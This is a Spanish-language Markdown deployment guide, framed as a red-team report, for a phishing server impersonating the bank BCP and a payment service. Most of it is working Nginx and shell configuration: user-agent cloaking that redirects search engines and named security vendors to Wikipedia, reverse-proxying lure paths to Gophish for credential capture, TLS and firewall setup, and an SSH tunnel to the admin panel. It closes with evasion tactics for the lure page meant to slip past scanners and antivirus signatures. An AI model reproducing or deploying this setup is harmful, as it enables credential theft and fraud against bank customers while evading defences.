# 🛡️ Reporte Maestro: Despliegue de Infraestructura Red Team (BCP & Pago-Rápido)

Este documento detalla la configuración de un servidor de phishing de alta evasión con Nginx como filtro global de bots y Gophish como motor de captura distribuido (Arquitectura Multi-Dominio).

---

## 1. Preparación y Limpieza del VPS (Ubuntu/Kali)
El servidor inicialmente tenía Apache2, lo cual causaba un conflicto de puertos (puerto 80) con Nginx.

```bash
# 1. Detener y deshabilitar Apache2 para liberar el puerto 80
sudo systemctl stop apache2
sudo systemctl disable apache2

# 2. Actualizar repositorios e instalar el Core de Nginx, Certbot y UFW
sudo apt update && sudo apt upgrade -y
sudo apt install nginx certbot python3-certbot-nginx tmux ufw -y
```

## 2. Configuración de la "Cara Pública" (Aging Multidominio)
Para evitar que los dominios sean marcados rápidamente, servimos contenido legítimo en la raíz de cada uno.

```bash
# Dominio 1: BCP Reportes
sudo mkdir -p /var/www/bcpreportes/html
sudo chown -R $USER:$USER /var/www/bcpreportes/html

# Dominio 2: Pago Rápido (Nuevo Vector)
sudo mkdir -p /var/www/pago-rapido/html
sudo chown -R $USER:$USER /var/www/pago-rapido/html
```
> **Nota:** Se debe crear un `index.html` inofensivo en cada ruta (ej. Informe de Seguridad o Plataforma de Pagos) para generar confianza a los escáneres.

## 3. El Cerebro Global: Configuración del Filtro Antibots
Para evitar duplicidad de código y proteger todos los dominios automáticamente, movimos el bloque `map` al archivo de configuración central de Nginx.

**Comando:** `sudo nano /etc/nginx/nginx.conf`
*(Añadir dentro del bloque `http { ... }`)*

```nginx
# FILTRO ANTIBOTS GLOBAL (Cloaking)
map $http_user_agent $es_sospechoso {
    default 0;
    ~*(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot) 1;
    ~*(virustotal|zscaler|paloalto|fireeye|crowdstrike|fortinet) 1;
    ~*(nikto|nmap|sqlmap|wpscan|python|go-http-client) 1;
}
```

## 4. Configuración de Sitios (Server Blocks)
Cada dominio tiene su propio archivo en `sites-available` para mantener el orden y la modularidad.

### 4.1. Dominio: bcpreportes.online
**Ruta:** `/etc/nginx/sites-available/bcpreportes.online`

```nginx
server {
    listen 80;
    server_name bcpreportes.online www.bcpreportes.online;
    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica](https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica); }
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name bcpreportes.online www.bcpreportes.online;
    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica](https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica); }
    
    location / { root /var/www/bcpreportes/html; index index.html; }
    
    location /reporte-personalizado {
        proxy_pass [http://127.0.0.1:8080](http://127.0.0.1:8080);
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### 4.2. Dominio: pago-rapido.online
**Ruta:** `/etc/nginx/sites-available/pago-rapido.online`

```nginx
server {
    listen 80;
    server_name pago-rapido.online www.pago-rapido.online;
    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Pasarela_de_pago](https://es.wikipedia.org/wiki/Pasarela_de_pago); }
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name pago-rapido.online www.pago-rapido.online;
    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Pasarela_de_pago](https://es.wikipedia.org/wiki/Pasarela_de_pago); }
    
    location / { root /var/www/pago-rapido/html; index index.html; }
    
    location /validar-pago {
        proxy_pass [http://127.0.0.1:8080](http://127.0.0.1:8080);
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

## 5. Activación, SSL y Firewall
Pasos críticos para que el servidor sea "visible" y seguro para la administración.

```bash
# 1. Eliminar el sitio default genérico para evitar fugas de información
sudo rm /etc/nginx/sites-enabled/default

# 2. Activar los nuevos dominios (Enlaces simbólicos)
sudo ln -s /etc/nginx/sites-available/bcpreportes.online /etc/nginx/sites-enabled/
sudo ln -s /etc/nginx/sites-available/pago-rapido.online /etc/nginx/sites-enabled/

# 3. Validar sintaxis y reiniciar el portero
sudo nginx -t && sudo systemctl restart nginx

# 4. Obtener SSL para ambos dominios (Candado verde)
sudo certbot --nginx -d bcpreportes.online -d www.bcpreportes.online
sudo certbot --nginx -d pago-rapido.online -d www.pago-rapido.online

# 5. Configurar Firewall UFW
sudo ufw allow 'Nginx Full' # Puertos 80 y 443
sudo ufw allow 22           # SSH
sudo ufw allow 3333         # Gophish Admin
sudo ufw enable
```

## 6. Gophish: Backend y Persistencia
Se ajustó `config.json` para que el tráfico de Nginx llegue correctamente al puerto `8080`.

```bash
# Limpiar procesos antiguos en el puerto 3333 antes de empezar
sudo fuser -k 3333/tcp

# Iniciar Gophish con persistencia (tmux)
tmux new -s gophish_session
cd ~/gophish && ./gophish

# Salir de tmux sin apagar: Ctrl + B, luego soltar y presionar D
```
* **Túnel SSH (Powershell Windows):** `ssh -L 3333:127.0.0.1:3333 kali@<IP_DEL_VPS>`
* **Acceso Admin:** `https://localhost:3333`

## 7. El Cebo: Código Camaleónico (Pixel Perfect)
Este código implementa fragmentación de texto y construcción dinámica en RAM para engañar a los scanners de seguridad.

* **Ghost Root:** El HTML inicial está vacío; la IA de seguridad perimetral no ve el phishing.
* **Activación Humana:** El formulario solo se construye con eventos de hardware (`mousemove` o `touchstart`).
* **Fragmentación:** Se rompen cadenas como `"Banca por " + "Internet"` para evitar firmas estáticas de motores antivirus.

## 8. Dudas Resueltas (El Saber del Pentester)

* **¿Por qué sigue activa la web legal?** Porque Nginx sirve el informe legal en la raíz (`/`) y Gophish solo toma el control en sub-rutas específicas como `/validar-pago` si llevan el parámetro `?rid=` correcto.
* **¿Por qué borrar el default?** Para evitar que peticiones directas por IP o HTTP lleguen a la carpeta raíz de Apache (`/var/www/html`), manteniendo la limpieza del servidor y ocultando la infraestructura.
* **¿Conflicto de puertos?** Nginx centraliza el tráfico 80/443 y lo reparte internamente al puerto 8080 de Gophish basándose en el nombre del dominio (Host header) solicitado.
